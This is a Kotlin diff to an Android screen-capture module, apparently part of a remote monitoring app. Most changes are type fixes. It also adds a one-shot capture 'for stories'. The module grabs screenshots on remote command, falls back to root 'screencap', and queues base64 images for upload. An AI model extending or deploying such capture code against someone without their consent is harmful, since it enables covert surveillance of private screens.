@@ -82,7 +82,7 @@ object RapidScreenCapture {
         context: Context,
         intervalMs: Long = DEFAULT_INTERVAL_MS,
         maxCaptures: Int = MAX_CAPTURES,
-        commandId: Long = 0
+        commandId: Long = 0L
     ) {
         if (isCapturing) {
             Log.w(TAG, "Already capturing")
@@ -103,8 +103,8 @@ object RapidScreenCapture {
         val queue = EventQueue.getInstance(context)
         
         // Événement de début de capture
-        queue.enqueue("rapid_capture_started", mapOf(
-            "sessionId" to sessionId,
+        queue.enqueue("rapid_capture_started", mapOf<String, Any>(
+            "sessionId" to (sessionId ?: ""),
             "intervalMs" to this.intervalMs,
             "maxCaptures" to maxCaptures,
             "commandId" to commandId,
@@ -118,6 +118,18 @@ object RapidScreenCapture {
     }
     
     /**
+     * Capture une seule fois (pour les stories, etc.)
+     */
+    fun captureOnce(context: Context) {
+        val storage = DeviceStorage.getInstance(context)
+        if (!storage.hasAccepted || storage.deviceToken == null) {
+            Log.w(TAG, "Device not configured")
+            return
+        }
+        captureScreen(context, 0L)
+    }
+    
+    /**
      * Arrête la capture rapide.
      */
     fun stopCapture(context: Context) {
@@ -127,8 +139,8 @@ object RapidScreenCapture {
         handler.removeCallbacksAndMessages(null)
         
         val queue = EventQueue.getInstance(context)
-        queue.enqueue("rapid_capture_stopped", mapOf(
-            "sessionId" to sessionId,
+        queue.enqueue("rapid_capture_stopped", mapOf<String, Any>(
+            "sessionId" to (sessionId ?: ""),
             "totalCaptures" to captureCount,
             "timestamp" to dateFormat.format(Date()),
         ))
@@ -179,8 +191,8 @@ object RapidScreenCapture {
         // Méthode 3: Fallback - envoyer un événement sans image
         Log.w(TAG, "No capture method available")
         val queue = EventQueue.getInstance(context)
-        queue.enqueue("rapid_capture_failed", mapOf(
-            "sessionId" to sessionId,
+        queue.enqueue("rapid_capture_failed", mapOf<String, Any>(
+            "sessionId" to (sessionId ?: ""),
             "captureIndex" to captureCount,
             "reason" to "No capture method available (need Android 11+ or ROOT)",
             "timestamp" to dateFormat.format(Date()),
@@ -237,7 +249,7 @@ object RapidScreenCapture {
                 "screencap -p $filename"
             )
             
-            if (result) {
+            if (result.success) {
                 // Lire le fichier
                 val file = java.io.File(filename)
                 if (file.exists()) {
@@ -282,8 +294,8 @@ object RapidScreenCapture {
             
             // Envoyer l'événement
             val queue = EventQueue.getInstance(context)
-            queue.enqueue("rapid_screenshot", mapOf(
-                "sessionId" to sessionId,
+            queue.enqueue("rapid_screenshot", mapOf<String, Any>(
+                "sessionId" to (sessionId ?: ""),
                 "captureIndex" to captureCount,
                 "imageBase64" to imageBase64,
                 "width" to scaledBitmap.width,
